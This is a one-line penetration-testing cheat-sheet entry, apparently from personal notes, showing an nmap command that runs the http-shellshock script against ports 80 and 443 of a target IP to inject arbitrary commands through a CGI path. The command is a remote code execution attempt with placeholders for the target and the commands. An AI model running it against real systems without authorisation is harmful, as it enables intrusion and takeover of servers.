# Nmap

`$ nmap -p80,443 -Pn -n --script=http-shellshock --script-args="http-shellshock.uri=/path/to/uri/file.cgi,cmd=<commands>" <IP>`